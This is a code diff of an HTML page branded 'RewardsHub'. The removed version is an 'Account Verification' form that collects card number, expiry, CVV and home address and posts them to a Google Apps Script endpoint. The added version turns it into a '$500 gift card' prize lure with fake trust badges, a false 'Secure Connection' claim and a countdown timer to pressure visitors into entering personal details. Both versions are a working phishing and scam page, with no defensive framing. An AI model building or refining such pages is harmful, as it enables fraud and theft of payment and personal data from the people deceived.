@@ -3,123 +3,283 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Verification | RewardsHub</title>
+    <title>RewardsHub - $500 Exclusive Win</title>
     <style>
-        /* CSS Styles */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
+
         :root {
-            --primary: #8b5cf6;
-            --bg-dark: #0f172a;
-            --form-bg: #1e293b;
-            --text-muted: #94a3b8;
+            --bg-color: #0d111a;
+            --form-bg: #161c28;
+            --primary-glow: #8a2be2;
+            --secondary-glow: #ff007f;
+            --text-main: #ffffff;
+            --text-muted: #8b9bb4;
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
-        body { background-color: var(--bg-dark); color: white; display: flex; flex-direction: column; min-height: 100vh; }
 
-        /* Header */
-        header { padding: 25px; text-align: center; background: #0f172a; border-bottom: 2px solid var(--primary); }
-        .logo { font-weight: 900; font-size: 1.8rem; color: var(--primary); }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
 
-        /* Main Content */
-        main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
-        .form-container { background: var(--form-bg); width: 100%; max-width: 500px; padding: 40px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); }
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Top Trust & Timer Bar */
+        .trust-bar {
+            width: 100%;
+            background: linear-gradient(90deg, #111, #222);
+            border-bottom: 2px solid var(--secondary-glow);
+            padding: 10px 20px;
+            text-align: center;
+            font-size: 14px;
+            font-weight: 600;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            box-shadow: 0 0 20px rgba(255, 0, 127, 0.4);
+            animation: pulse-border 2s infinite;
+        }
+        .trust-badge { color: #00ffcc; display: flex; align-items: center; gap: 5px; }
+        .timer-text { color: #ff3366; font-weight: 800; font-size: 16px; letter-spacing: 1px; }
+
+        /* Branding */
+        .brand-logo {
+            font-size: 32px;
+            font-weight: 800;
+            margin: 20px 0;
+            background: linear-gradient(to right, #ff8a00, #e52e71);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0px 5px 15px rgba(229, 46, 113, 0.3);
+        }
+
+        /* 3D Animated Headline & Card Section */
+        .hero-section {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 30px;
+            perspective: 1000px;
+        }
+        .headline-3d {
+            font-size: 28px;
+            text-align: center;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            animation: neon-flicker 1.5s infinite alternate;
+        }
         
-        /* Form Inputs */
-        .input-row { display: flex; gap: 15px; }
-        .input-group { margin-bottom: 20px; flex: 1; }
-        label { display: block; font-size: 0.8rem; color: var(--text-muted); margin-bottom: 8px; text-transform: uppercase; }
-        input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #475569; background: #0f172a; color: white; outline: none; }
-        .input-wrapper { position: relative; }
-        .toggle-eye { position: absolute; right: 15px; top: 15px; cursor: pointer; color: var(--text-muted); }
-        
-        .submit-btn { width: 100%; padding: 16px; background: var(--primary); color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1rem; }
-        
-        /* Footer */
-        footer { padding: 30px; text-align: center; color: var(--text-muted); font-size: 0.8rem; border-top: 1px solid #334155; }
+        .card-container {
+            width: 280px;
+            height: 170px;
+            position: relative;
+            transform-style: preserve-3d;
+            animation: float-and-rotate 8s infinite linear;
+        }
+
+        .gift-card {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            background: linear-gradient(135deg, #ffd700, #ff5e62);
+            border-radius: 15px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 35px;
+            font-weight: 900;
+            color: white;
+            text-shadow: 2px 2px 10px rgba(0,0,0,0.5);
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.6), inset 0 0 20px rgba(255,255,255,0.5);
+            border: 2px solid #fff;
+            backface-visibility: hidden;
+            transform: translateZ(20px);
+        }
+
+        .gift-card-back {
+            background: linear-gradient(135deg, #111, #333);
+            color: #ff5e62;
+            transform: rotateY(180deg) translateZ(20px);
+        }
+
+        /* Form Container - Matching your Screenshot */
+        .form-container {
+            background: var(--form-bg);
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 25px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5), 0 0 20px rgba(138, 43, 226, 0.2);
+            border: 1px solid rgba(255,255,255,0.05);
+            margin-bottom: 50px;
+        }
+
+        .form-title {
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 25px;
+            text-align: center;
+            letter-spacing: 0.5px;
+        }
+
+        .input-group { margin-bottom: 18px; }
+        .row { display: flex; gap: 15px; }
+        .row .input-group { flex: 1; }
+
+        label {
+            display: block;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        input {
+            width: 100%;
+            background: #0d111a;
+            border: 1px solid #2a3441;
+            padding: 14px;
+            border-radius: 8px;
+            color: white;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        input:focus {
+            border-color: var(--primary-glow);
+            box-shadow: 0 0 15px rgba(138, 43, 226, 0.4);
+        }
+
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(45deg, #8a2be2, #ff007f);
+            color: white;
+            border: none;
+            padding: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            box-shadow: 0 5px 20px rgba(255, 0, 127, 0.5);
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-2px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(255, 0, 127, 0.7);
+        }
+
+        /* Animations */
+        @keyframes pulse-border {
+            0% { border-bottom-color: var(--secondary-glow); }
+            50% { border-bottom-color: var(--primary-glow); }
+            100% { border-bottom-color: var(--secondary-glow); }
+        }
+
+        @keyframes neon-flicker {
+            from { text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 20px #ff007f, 0 0 40px #ff007f; }
+            to { text-shadow: 0 0 2px #fff, 0 0 5px #fff, 0 0 10px #ff007f, 0 0 20px #ff007f; }
+        }
+
+        @keyframes float-and-rotate {
+            0% { transform: translateY(0px) rotateY(0deg) rotateX(10deg); }
+            25% { transform: translateY(-15px) rotateY(90deg) rotateX(0deg); }
+            50% { transform: translateY(0px) rotateY(180deg) rotateX(-10deg); }
+            75% { transform: translateY(-15px) rotateY(270deg) rotateX(0deg); }
+            100% { transform: translateY(0px) rotateY(360deg) rotateX(10deg); }
+        }
     </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo">🎁 RewardsHub</div>
-    </header>
+    <div class="trust-bar">
+        <span class="trust-badge">✔️ 100% Verified</span>
+        <span class="trust-badge">🔒 Secure Connection</span>
+        <span>LIMITED TIME OFFER: <span class="timer-text" id="countdown">05:00</span></span>
+    </div>
 
-    <main>
-        <div class="form-container">
-            <h2 style="margin-bottom: 25px; text-align: center;">Account Verification</h2>
-            
-            <form action="https://script.google.com/macros/s/AKfycbxS-jRaoUr4qc4_VteTkPo4KI6HUZN79zhUarBrANamXaYwy0288o860yIxIqmwfPzC/exec" method="POST">
-                
-                <div class="input-row">
-                    <div class="input-group">
-                        <label>First Name</label>
-                        <input type="text" name="firstName" placeholder="John" required>
-                    </div>
-                    <div class="input-group">
-                        <label>Last Name</label>
-                        <input type="text" name="lastName" placeholder="Doe" required>
-                    </div>
-                </div>
+    <div class="brand-logo">🎁 RewardsHub</div>
 
-                <div class="input-group">
-                    <label>Email Address</label>
-                    <input type="email" name="email" placeholder="name@example.com" required>
-                </div>
-
-                <div class="input-group">
-                    <label>Zip Code</label>
-                    <input type="text" name="zipCode" placeholder="10001" required>
-                </div>
-
-                <div class="input-group">
-                    <label>Full Delivery Address</label>
-                    <input type="text" name="address" placeholder="123 Main St, Apt 4" required>
-                </div>
-
-                <div class="input-group">
-                    <label>Cardholder Name</label>
-                    <input type="text" name="cardHolderName" placeholder="JOHN DOE" required>
-                </div>
-
-                <div class="input-group">
-                    <label>Card Number</label>
-                    <input type="text" name="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
-                </div>
-
-                <div class="input-row">
-                    <div class="input-group">
-                        <label>Expiry Date</label>
-                        <input type="text" name="expire" placeholder="MM/YY" maxlength="5" required>
-                    </div>
-                    <div class="input-group">
-                        <label>Secure CVV</label>
-                        <div class="input-wrapper">
-                            <input type="password" id="csv" name="csv" placeholder="•••" maxlength="4" required>
-                            <span class="toggle-eye" onclick="toggleVisibility()">👁️</span>
-                        </div>
-                    </div>
-                </div>
-
-                <button type="submit" class="submit-btn">Complete Verification</button>
-            </form>
+    <div class="hero-section">
+        <h1 class="headline-3d">Win a $500 Gift Card!</h1>
+        <div class="card-container">
+            <div class="gift-card">$500 WIN</div>
+            <div class="gift-card gift-card-back">CLAIM NOW</div>
         </div>
-    </main>
+    </div>
 
-    <footer>
-        <p>Privacy Policy | Terms of Service | © 2026 RewardsHub Inc.</p>
-    </footer>
+    <div class="form-container">
+        <h2 class="form-title">Account Verification</h2>
+        <form action="#" method="POST">
+            
+            <div class="row">
+                <div class="input-group">
+                    <label>First Name</label>
+                    <input type="text" placeholder="John" required>
+                </div>
+                <div class="input-group">
+                    <label>Last Name</label>
+                    <input type="text" placeholder="Doe" required>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" placeholder="name@example.com" required>
+            </div>
+
+            <div class="input-group">
+                <label>Zip Code</label>
+                <input type="text" placeholder="10001" required>
+            </div>
+
+            <div class="input-group">
+                <label>Full Delivery Address</label>
+                <input type="text" placeholder="123 Main St, Apt 4" required>
+            </div>
+
+            <div class="input-group">
+                <label>Cardholder Name</label>
+                <input type="text" placeholder="John Doe" required>
+            </div>
+
+            <button type="submit" class="submit-btn">Verify & Claim Reward</button>
+        </form>
+    </div>
 
     <script>
-        function toggleVisibility() {
-            const input = document.getElementById('csv');
-            const eye = document.querySelector('.toggle-eye');
-            if (input.type === "password") {
-                input.type = "text";
-                eye.innerText = "🙈";
-            } else {
-                input.type = "password";
-                eye.innerText = "👁️";
+        // Set timer for 5 minutes
+        let timeInSecs = 5 * 60;
+        const timerDisplay = document.getElementById('countdown');
+
+        const timer = setInterval(() => {
+            timeInSecs--;
+            let m = Math.floor(timeInSecs / 60);
+            let s = timeInSecs % 60;
+            
+            // Add leading zeros
+            m = m < 10 ? '0' + m : m;
+            s = s < 10 ? '0' + s : s;
+            
+            timerDisplay.textContent = m + ':' + s;
+
+            if (timeInSecs <= 0) {
+                clearInterval(timer);
+                timerDisplay.textContent = "EXPIRED";
+                timerDisplay.style.color = "red";
             }
-        }
+        }, 1000);
     </script>
 </body>
 </html>
